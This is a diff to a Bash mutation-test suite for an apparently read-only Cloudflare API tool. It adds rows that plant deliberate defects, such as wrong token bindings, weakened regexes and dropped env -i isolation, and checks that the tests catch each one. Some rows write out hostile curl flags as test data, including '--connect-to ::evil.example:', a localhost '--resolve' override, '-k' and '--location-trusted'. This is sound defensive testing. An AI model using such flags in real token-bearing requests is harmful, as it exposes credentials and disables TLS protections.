+  mutate "G2.A1 analytics falls back to the AUDIT token" "token[analytics-health]: only the four old tokens set -> exit 10" token '  analytics-health) need_hours "$@"; TOKVAR=CF_API_TOKEN_ANALYTICS_READ;' '  analytics-health) need_hours "$@"; TOKVAR=CF_API_TOKEN_ANALYTICS_READ; [ -n "${CF_API_TOKEN_ANALYTICS_READ:-}" ] || TOKVAR=CF_API_TOKEN_AUDIT;'
+  mutate "G2.A2 analytics-edge-errors bound to RULESETS" "wire[analytics-edge-errors]: stdin carries the bound token exactly once" wire '  analytics-edge-errors) need_hours "$@"; TOKVAR=CF_API_TOKEN_ANALYTICS_READ;' '  analytics-edge-errors) need_hours "$@"; TOKVAR=CF_API_TOKEN_RULESETS;'
+  mutate "G2.A3 xtrace list drops the analytics token" "xtrace[CF_API_TOKEN_ANALYTICS_READ alone]: exit 78" xtrace '${CF_API_TOKEN_ANALYTICS_READ:+x}' ''
+  mutate "G2.A4 an old subcommand reads the analytics token" "token[change-history]: only the analytics token set -> exit 10, curl never called" token 'change-history) TOKVAR=CF_API_TOKEN_AUDIT;' 'change-history) TOKVAR=CF_API_TOKEN_ANALYTICS_READ;'
+  mutate "G2.A5 a sixth token name" "source: anchor - the dispatcher binds exactly five token variables" source '  pagerules-ssl) TOKVAR=CF_API_TOKEN_PAGERULES_READ;' '  pagerules-ssl) TOKVAR=CF_API_TOKEN_SIXTH; TOKVAR=CF_API_TOKEN_PAGERULES_READ;'
+  mutate "G2.A5b the xtrace list no longer matches the dispatcher names" "source: the xtrace refusal list names exactly" source 'TOKVAR=CF_API_TOKEN_ANALYTICS_READ; load_credential zone; sub_analytics_health' 'TOKVAR=CF_API_TOKEN_ANALYTICS_READX; load_credential zone; sub_analytics_health'
+  mutate_suite suitemut "G2.A6 harness: the analytics token is no leak needle" "leak control: needle list has at least 14 non-empty members" status 'LEAK_NEEDLES=("$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_N" "$TOK_''BARE"' 'LEAK_NEEDLES=("$TOK_Z" "$TOK_R" "$TOK_P" "$TOK_A" "$TOK_BARE"'
 
   # --- review round: children run under env -i (W1) ---
   mutate "W1.1 project jq without env -i" "env[jq/ssl-mode]: a planted \$HOME/.jq redefining test leaks no token" env,source '  res=$(/usr/bin/env -i /usr/bin/jq -c' '  res=$(/usr/bin/jq -c'
-  mutate "W1.2 guard jq without env -i" "census: every jq/date use is the exact call form" source '  kind=$(/usr/bin/env -i /usr/bin/jq -r' '  kind=$(/usr/bin/jq -r'
-  mutate "W1.2b guard jq without env -i, behavioural" "env[jq-guard/ssl-mode]: with a planted" env '  kind=$(/usr/bin/env -i /usr/bin/jq -r' '  kind=$(/usr/bin/jq -r'
+  mutate "W1.2 guard jq without env -i" "census: every jq/date use is the exact call form" source '  kind=$(/usr/bin/env -i /usr/bin/jq -r "if .success' '  kind=$(/usr/bin/jq -r "if .success'
+  mutate "W1.2b guard jq without env -i, behavioural" "env[jq-guard/ssl-mode]: with a planted" env '  kind=$(/usr/bin/env -i /usr/bin/jq -r "if .success' '  kind=$(/usr/bin/jq -r "if .success'
   mutate "W1.3 date (now) without env -i" "census: every jq/date use is the exact call form" source '  now=$(/usr/bin/env -i /usr/bin/date' '  now=$(/usr/bin/date'
   mutate "W1.4 date (since) without env -i" "census: every jq/date use is the exact call form" source '  since=$(/usr/bin/env -i /usr/bin/date' '  since=$(/usr/bin/date'
-  mutate "W1.6 bare jq with a decoy trailing comment" "census: every jq/date use is the exact call form" source '  res=$(/usr/bin/env -i /usr/bin/jq -c --argjson limit "$LIMIT" "$JQ_DEFS $1" < <(printf '"'%s'"' "$BODY") 2>&1)' '  res=$(/usr/bin/jq -c --argjson limit "$LIMIT" "$JQ_DEFS $1" < <(printf '"'%s'"' "$BODY") 2>&1) # $(/usr/bin/env -i /usr/bin/jq '
-  mutate "W1.7 jq path built from a variable" "census: no tool path built from a variable" source '  kind=$(/usr/bin/env -i /usr/bin/jq -r' '  P=/usr/bin; kind=$(/usr/bin/env -i $P/jq -r'
+  mutate "W1.6 bare jq with a decoy trailing comment" "census: every jq/date use is the exact call form" source '  res=$(/usr/bin/env -i /usr/bin/jq -c --argjson limit "$LIMIT" --argjson qlimit "$QLIMIT" --argjson hours "$HOURS" "$JQ_DEFS $1" < <(printf '"'%s'"' "$BODY") 2>&1)' '  res=$(/usr/bin/jq -c --argjson limit "$LIMIT" --argjson qlimit "$QLIMIT" --argjson hours "$HOURS" "$JQ_DEFS $1" < <(printf '"'%s'"' "$BODY") 2>&1) # $(/usr/bin/env -i /usr/bin/jq '
+  mutate "W1.7 jq path built from a variable" "census: no tool path built from a variable" source '  kind=$(/usr/bin/env -i /usr/bin/jq -r "if .success' '  P=/usr/bin; kind=$(/usr/bin/env -i $P/jq -r "if .success'
   mutate "W1.8 date path from a defaulted variable" "census: no tool path built from a variable" source '  now=$(/usr/bin/env -i /usr/bin/date' '  now=$(/usr/bin/env -i ${D:-/usr/bin}/date'
   mutate "W1.5 a bare jq command" "census: no bare jq or date command" source '  [ -x /usr/bin/jq ] || unverified "no-tool (jq)" 14' $'  [ -x /usr/bin/jq ] || unverified "no-tool (jq)" 14\n  jq -n 1'
 
@@ -1321,9 +1847,9 @@ if [[ -z "$INNER" ]] && want all; then
   mutate "W2.4 enabled_ssl_rules is just the rule count" "proj[config-entrypoint]: header fields, rule_count 3, enabled_ssl_rules 2" proj 'enabled_ssl_rules: ([$rr[] | select(.enabled and .ssl != null)] | length)' 'enabled_ssl_rules: ($rules | length)'
 
   # --- bad-response reasons, preflight, LIMIT, Z-only, hint (W3) ---
-  mutate "W3.1 shape reported as a jq failure" "shape[ssl-mode]: a well-formed body of the wrong shape" shape '    *) bad_shape ;;' '    *) bad_jq 1 ;;'
+  mutate "W3.1 shape reported as a jq failure" "shape[ssl-mode]: a well-formed body of the wrong shape" shape $'    api) unverified api-error 14 ;;\n    *) bad_shape ;;' $'    api) unverified api-error 14 ;;\n    *) bad_jq 1 ;;'
   mutate "W3.2 delete the jq preflight" "tools[ssl-mode]: no jq -> unverified - no-tool (jq)" tools '  [ -x /usr/bin/jq ] || unverified "no-tool (jq)" 14' '  :'
-  mutate "W3.3 delete the date preflight" "tools[change-history]: no date -> unverified - no-tool (date)" tools '  [ -x /usr/bin/date ] || unverified "no-tool (date)" 14' '  :'
+  mutate "W3.3 delete the date preflight" "tools[change-history]: no date -> unverified - no-tool (date)" tools $'  [ -x /usr/bin/date ] || unverified "no-tool (date)" 14\n  now=' $'  :\n  now='
   mutate "W3.4 date message claims GNU date" "tools[fakedate_rel]: the message names only what was measured" tools '[[ ! "$since" =~ $STAMP_RE ]]; then die 64 "refused: date produced no valid UTC stamp"' '[[ ! "$since" =~ $STAMP_RE ]]; then die 64 "refused: date does not support relative times (GNU date required)"'
   mutate "W3.5 LIMIT drifts from 50" "wire[change-history]: URL matches the fixed audit template" wire,source $'\nLIMIT=50\n' $'\nLIMIT=40\n'
   mutate "W3.6 truncated test hardcodes a different limit" "proj[change-history]: 50 rows -> truncated true" proj '>= $limit' '>= 51'
@@ -1348,19 +1874,19 @@ if [[ -z "$INNER" ]] && want all; then
   mutate "W4.13 action type without gk" "proj[change-history]: hostile action-type is sanitized" proj 'by_action_type: ([$r[] | ((.action | if type == "object" then .type else null end) | gk)]' 'by_action_type: ([$r[] | ((.action | if type == "object" then .type else null end))]'
   mutate "W4.14 resource type without gk" "proj[change-history]: hostile resource-type is sanitized" proj 'by_resource_type: ([$r[] | ((.resource | if type == "object" then .type else null end) | gk)]' 'by_resource_type: ([$r[] | ((.resource | if type == "object" then .type else null end))]'
   mutate "W4.15 audit time filter dropped" "proj[change-history]: hostile action-time is sanitized" proj 'select(type == "string" and test(rfc))' 'select(type == "string")'
-  mutate_suite suitemut "W4.16 the proj group is dropped from the run loop" "proj floor" proj "for g in source wire refuse token env status xtrace pr""oj shape tools selftest; do" "for g in source wire refuse token env status xtrace shape tools selftest; do"
+  mutate_suite suitemut "W4.16 the proj group is dropped from the run loop" "proj floor" proj "for g in source wire refuse token env status xtrace pr""oj shape tools gql selftest; do" "for g in source wire refuse token env status xtrace shape tools gql selftest; do"
 
   # --- closed argv vector (W5) ---
   mutate "W5.1 duplicated -X GET" "wire[ssl-mode]: recorded argv equals the closed vector" wire '-X GET -sS' '-X GET -X GET -sS'
   mutate "W5.2 second -X POST" "wire[ssl-mode]: recorded argv equals the closed vector" wire '-X GET -sS' '-X GET -X POST -sS'
   mutate "W5.3 glued -XPOST" "wire[ssl-mode]: recorded argv equals the closed vector" wire '-X GET -sS' '-XPOST -sS'
-  mutate "W5.4 --connect-to" "wire[ssl-mode]: recorded argv equals the closed vector" wire '--max-redirs 0' '--max-redirs 0 --connect-to ::evil.example:'
-  mutate "W5.5 -k" "wire[ssl-mode]: recorded argv equals the closed vector" wire '-sS --max-time 20' '-sS -k --max-time 20'
+  mutate "W5.4 --connect-to" "wire[ssl-mode]: recorded argv equals the closed vector" wire '-X GET -sS --max-time 20 --max-redirs 0' '-X GET -sS --max-time 20 --max-redirs 0 --connect-to ::evil.example:'
+  mutate "W5.5 -k" "wire[ssl-mode]: recorded argv equals the closed vector" wire '-X GET -sS --max-time 20' '-X GET -sS -k --max-time 20'
   mutate "W5.6 --config /dev/null" "wire[ssl-mode]: recorded argv equals the closed vector" wire '--config - "$url"' '--config /dev/null "$url"'
   mutate "W5.7 -K - instead of --config -" "wire[ssl-mode]: the stub refused no flag" wire '--config - "$url"' '-K - "$url"'
-  mutate "W5.8 --location-trusted" "wire[ssl-mode]: recorded argv equals the closed vector" wire '--max-redirs 0' '--max-redirs 0 --location-trusted'
-  mutate "W5.9 --resolve" "wire[ssl-mode]: recorded argv equals the closed vector" wire '--max-redirs 0' '--max-redirs 0 --resolve api.cloudflare.com:443:127.0.0.1'
-  mutate "W5.10 --form-string" "wire[ssl-mode]: recorded argv equals the closed vector" wire '--max-redirs 0' '--max-redirs 0 --form-string a=b'
+  mutate "W5.8 --location-trusted" "wire[ssl-mode]: recorded argv equals the closed vector" wire '-X GET -sS --max-time 20 --max-redirs 0' '-X GET -sS --max-time 20 --max-redirs 0 --location-trusted'
+  mutate "W5.9 --resolve" "wire[ssl-mode]: recorded argv equals the closed vector" wire '-X GET -sS --max-time 20 --max-redirs 0' '-X GET -sS --max-time 20 --max-redirs 0 --resolve api.cloudflare.com:443:127.0.0.1'
+  mutate "W5.10 --form-string" "wire[ssl-mode]: recorded argv equals the closed vector" wire '-X GET -sS --max-time 20 --max-redirs 0' '-X GET -sS --max-time 20 --max-redirs 0 --form-string a=b'
 
   # --- ids, xtrace per variable, dispatcher, request census, CURL census, source guards (W6) ---
   mutate "W6.1 unanchored id regex" "refuse: CF_ZONE_ID path-dot-dot -> exit 64" refuse "ID_RE='^[0-9a-f]{32}\$'" "ID_RE='[0-9a-f]{32}'"
@@ -1372,8 +1898,8 @@ if [[ -z "$INNER" ]] && want all; then
   mutate "W6.6 xtrace list drops CF_API_TOKEN" "xtrace[CF_API_TOKEN alone]: exit 78" xtrace '${CF_API_TOKEN:+x}' ''
   mutate "W6.7 3-space quoted fifth arm" "parity: dispatcher case labels" source '  *) die 64 "refused: unknown subcommand" ;;' $'   "raw") sub_ssl_mode ;;\n  *) die 64 "refused: unknown subcommand" ;;'
   mutate "W6.8 behavioural fifth arm (purge)" "refuse fuzz: name purge" source,refuse '  *) die 64 "refused: unknown subcommand" ;;' $'  purge) TOKVAR=CF_API_TOKEN_ZONE_SETTINGS; load_credential zone; sub_ssl_mode ;;\n  *) die 64 "refused: unknown subcommand" ;;'
-  mutate "W6.9 arm smuggled on an existing line" "census: dispatcher arm terminators == 5" source 'load_credential zone; sub_ssl_mode ;;' 'load_credential zone; sub_ssl_mode ;; hostnames) sub_ssl_mode ;;'
-  mutate "W6.10 body-conditional extra request" "census: exactly four cf_get call sites" source,wire '    ok) : ;;' '    ok) cf_get "$BASE/zones/$CF_ZONE_ID/settings/ssl" ;;'
+  mutate "W6.9 arm smuggled on an existing line" "census: dispatcher arm terminators == 7" source 'load_credential zone; sub_ssl_mode ;;' 'load_credential zone; sub_ssl_mode ;; hostnames) sub_ssl_mode ;;'
+  mutate "W6.10 body-conditional extra request" "census: exactly four cf_get call sites" source,wire $'    ok) : ;;\n    api) unverified api-error 14 ;;' $'    ok) cf_get "$BASE/zones/$CF_ZONE_ID/settings/ssl" ;;\n    api) unverified api-error 14 ;;'
   mutate "W6.11 a URL template tampered" "census: the four cf_get URL templates" source 'pagerules?status=active"' 'pagerules?status=all"'
   mutate "W6.12 CURL conditional override" "census: CURL is assigned exactly once" source $'\nCURL=/usr/bin/curl\n' $'\nCURL=/usr/bin/curl\n[ -n "${CF_CURL:-}" ] && CURL=$CF_CURL\n'
   mutate "W6.13 CURL exported" "census: that one assignment is the column-0 literal" source $'\nCURL=/usr/bin/curl\n' $'\nexport CURL=/usr/bin/curl\n'
@@ -1386,6 +1912,44 @@ if [[ -z "$INNER" ]] && want all; then
   mutate "W6.20 env NAME=value prefix" "source: no NAME=value prefix on an env child" source '/usr/bin/env -i /usr/bin/jq -c' '/usr/bin/env -i X=1 /usr/bin/jq -c'
   mutate "W6.21 token variable on a jq line" "census: no token, zone or account variable on any jq/date line" source '--argjson limit "$LIMIT"' '--argjson limit "$LIMIT$TOK"'
   mutate "W6.22 xtrace list vs dispatcher TOKVAR" "source: the xtrace refusal list names exactly" source 'TOKVAR=CF_API_TOKEN_AUDIT;' 'TOKVAR=CF_API_TOKEN_AUDITX;'
+
+  # --- analytics: the grammar, the window, the verdicts and the projection (each new behaviour has its own row) ---
+  mutate "G1.H1 hours regex accepts zero" "refuse: analytics-health hours zero -> exit 64" refuse '^[1-9][0-9]{0,2}$' '^[0-9]{1,3}$'
+  mutate "G1.H1b hours regex unanchored at the end" "refuse: analytics-health hours trailing-newline -> exit 64" refuse '^[1-9][0-9]{0,2}$' '^[1-9][0-9]{0,2}'
+  mutate "G1.H2 the 216 cap check widened" "refuse: analytics-health hours 217 (above the cap) -> exit 64" refuse 'if [ "$2" -gt "$MAX_HOURS" ]; then' 'if [ "$2" -gt 999 ]; then'
+  mutate "G1.H2b MAX_HOURS raised" "refuse: analytics-health hours 217 (above the cap) -> exit 64" refuse 'MAX_HOURS=216' 'MAX_HOURS=300'
+  mutate "G1.H3 hours validated after load_credential" "grammar: analytics-health bad hours with no token set exits 64, not 10" refuse '  analytics-health) need_hours "$@"; TOKVAR=CF_API_TOKEN_ANALYTICS_READ; load_credential zone; sub_analytics_health ;;' '  analytics-health) TOKVAR=CF_API_TOKEN_ANALYTICS_READ; load_credential zone; need_hours "$@"; sub_analytics_health ;;'
+  mutate "G1.H4 the window end is not rounded to the hour" "gql[clock/analytics-health/h1]: the window is" gql '  end=$((10#$t - 10#$t % 3600))' '  end=$((10#$t))'
+  mutate "G1.H4b the window start ignores the hours" "gql[clock/analytics-health/h216]: the window is" gql '  start=$((end - HOURS * 3600))' '  start=$((end - 3600))'
+  mutate "G1.H5 zones [] maps to exit 11" "zones [] with no errors -> unverified - no-zone-access, exit 14 (not 11)" proj '    nozone) unverified no-zone-access 14 ;;' '    nozone) unverified no-zone-access 11 ;;'
+  mutate "G1.H5b zones [] maps to bad-response" "zones [] with no errors -> unverified - no-zone-access, exit 14 (not 11)" proj '    nozone) unverified no-zone-access 14 ;;' '    nozone) bad_shape ;;'
+  mutate "G1.H6 zones longer than one accepted" "two zones -> bad-response (shape), exit 14" proj 'elif (length == 1 and (.[0] | type)' 'elif (length >= 1 and (.[0] | type)'
+  mutate "G1.H7 the edge hourly list is not sorted" "proj[analytics-edge-errors]: hourly is sorted ascending by hour then status" proj 'sort_by([.hour, .status])' '.'
+  mutate "G1.H8 truncated threshold off by one" "proj[analytics-edge-errors]: 1000 rows -> truncated true" proj 'truncated: (($g | length) >= $qlimit)' 'truncated: (($g | length) > $qlimit)'
+  mutate "G1.H8b truncated threshold hardcoded high" "proj[analytics-edge-errors]: 1000 rows -> truncated true" proj 'truncated: (($g | length) >= $qlimit)' 'truncated: (($g | length) >= 5000)'
+  mutate "G1.H9 by_status takes the first count instead of the sum" "proj[analytics-edge-errors]: by_status sums the counts per observed status" proj 'value: (map(.c) | add)' 'value: (map(.c) | first)'
+  mutate "G1.H10 the status upper bound widened" "a 600 status -> bad-response (shape)" proj '. >= 500 and . <= 599' '. >= 500 and . <= 699'
+  mutate "G1.H10b the status lower bound widened" "a 499 status -> bad-response (shape)" proj '. >= 500 and . <= 599' '. >= 400 and . <= 599'
+  mutate "G1.H11 the hour regex dropped from the health check" "a hostile hour (EXPR_CANARY) -> bad-response (shape)" proj '(.dimensions.datetimeHour | type == "string" and test(rfc)) and ((.avg | type)' '(.dimensions.datetimeHour | type == "string") and ((.avg | type)'
+  mutate "G1.H12 the count ceiling widened" "a count above 1e12 -> bad-response (shape)" proj '. >= 0 and . <= 1e12' '. >= 0 and . <= 1e15'
+  mutate "G1.H12b the duration ceiling widened" "a p90 above 1e7 -> bad-response (shape)" proj '. >= 0 and . <= 1e7' '. >= 0 and . <= 1e9'
+  mutate "G1.H12c a null duration is no longer allowed" "a JSON null duration passes through as null" proj 'def dur: . == null or (type == "number"' 'def dur: (type == "number"'
+  mutate "G1.H13 durations are not rounded" "durations are rounded to one decimal" proj 'def r1: if . == null then null else ((. * 10 | round) / 10) end;' 'def r1: .;'
+  mutate "G1.H14 an error list is ignored" "api-error message ok is printed" proj 'if ((.errors | type) == \"array\" and (.errors | length) > 0) then \"api\" elif' 'if false then \"api\" elif'
+  mutate "W1.9 message jq without env -i" "census: every jq/date use is the exact call form" source '  m=$(/usr/bin/env -i /usr/bin/jq -j' '  m=$(/usr/bin/jq -j'
+  mutate "W1.10 gql guard jq without env -i" "census: every jq/date use is the exact call form" source '  kind=$(/usr/bin/env -i /usr/bin/jq -r "$JQ_DEFS' '  kind=$(/usr/bin/jq -r "$JQ_DEFS'
+  mutate "W1.10b gql guard jq without env -i, behavioural" "env[jq-guard/analytics-health]: with a planted" env '  kind=$(/usr/bin/env -i /usr/bin/jq -r "$JQ_DEFS' '  kind=$(/usr/bin/jq -r "$JQ_DEFS'
+  mutate "W1.11 the epoch date child without env -i" "census: every jq/date use is the exact call form" source '  t=$(/usr/bin/env -i /usr/bin/date' '  t=$(/usr/bin/date'
+  mutate "W1.12 the window-end date child without env -i" "census: every jq/date use is the exact call form" source '  WIN_END=$(/usr/bin/env -i /usr/bin/date' '  WIN_END=$(/usr/bin/date'
+  mutate "W1.13 the window-start date child without env -i" "census: every jq/date use is the exact call form" source '  WIN_START=$(/usr/bin/env -i /usr/bin/date' '  WIN_START=$(/usr/bin/date'
+  mutate "W3.1g gql shape reported as a jq failure" "shape[analytics-health]: a well-formed body of the wrong shape" shape $'    nozone) unverified no-zone-access 14 ;;\n    *) bad_shape ;;' $'    nozone) unverified no-zone-access 14 ;;\n    *) bad_jq 1 ;;'
+  mutate "W3.3g delete the analytics date preflight" "tools[analytics-health]: no date -> unverified - no-tool (date), exit 14" tools $'  [ -x /usr/bin/date ] || unverified "no-tool (date)" 14\n  t=' $'  :\n  t='
+  mutate "W3.2g delete the jq preflight call in cf_graphql" "tools[analytics-health]: no jq -> curl never called" tools $'  local body="$1" esc out rc\n  preflight' $'  local body="$1" esc out rc\n  :'
+  mutate "W5.1p POST vector duplicated -X" "wire[analytics-health]: recorded argv equals the closed vector" wire '-X POST -sS' '-X POST -X POST -sS'
+  mutate "W5.3p POST vector glued -XPOST" "wire[analytics-health]: recorded argv equals the closed vector" wire '-X POST -sS' '-XPOST -sS'
+  mutate "W5.4p POST vector --connect-to" "wire[analytics-health]: recorded argv equals the closed vector" wire '-X POST -sS --max-time 20 --max-redirs 0' '-X POST -sS --max-time 20 --max-redirs 0 --connect-to ::evil.example:'
+  mutate "W5.6p POST vector --config /dev/null" "wire[analytics-health]: recorded argv equals the closed vector" wire '--config - "$GQL_URL"' '--config /dev/null "$GQL_URL"'
+  mutate "W5.7p POST body on argv (-d)" "wire[analytics-health]: recorded argv equals the closed vector" wire '--config - "$GQL_URL"' '-d "$esc" --config - "$GQL_URL"'
 
   # --- the harness itself (W6 h, i, j) ---
   MUT_KIND=wholesale mutate_kind "W6.23 harness: a wholesale break exceeds the distinct-failure bound" "" all $'\nset -uo pipefail\n' $'\nexit 3\nset -uo pipefail\n'
@@ -1400,7 +1964,7 @@ if [[ -z "$INNER" ]] && want all; then
 
   collect
   t "mutation floor: every mutation row ran and was caught ($MUT_CAUGHT of $MUT_TOTAL)" eq "$MUT_CAUGHT" "$MUT_TOTAL"
-  t "mutation floor: at least 108 mutation rows ran (the exact current count)" test "$MUT_TOTAL" -ge 108
+  t "mutation floor: at least 175 mutation rows ran (the exact current count)" test "$MUT_TOTAL" -ge 175
 fi
 
 # --- accounting ---
@@ -1408,7 +1972,7 @@ if [[ "$((pass + fail))" != "$asserted" ]]; then
   no "accounting: passes + fails ($((pass + fail))) != asserted ($asserted) - a verdict was dropped"
 fi
 if [[ "$SELECT" == all && -z "$INNER" ]]; then
-  t "floor: at least 400 assertions ran (a suite that checked nothing is RED)" test "$asserted" -ge 400
+  t "floor: at least 1800 assertions ran (a suite that checked nothing is RED)" test "$asserted" -ge 1800
 fi
 printf '\n%s passed, %s failed (%s asserted)\n' "$pass" "$fail" "$asserted"
 if [[ "$fail" -gt 0 ]]; then exit 1; fi
